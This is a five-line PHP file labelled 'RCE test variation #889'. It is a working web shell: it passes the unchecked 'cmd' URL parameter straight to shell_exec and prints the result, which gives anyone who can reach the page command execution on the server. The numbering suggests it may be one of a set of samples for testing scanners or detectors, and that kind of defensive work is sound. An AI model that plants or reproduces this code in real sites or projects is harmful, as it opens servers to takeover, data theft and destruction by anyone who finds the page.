<?php
// RCE test variation #889
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>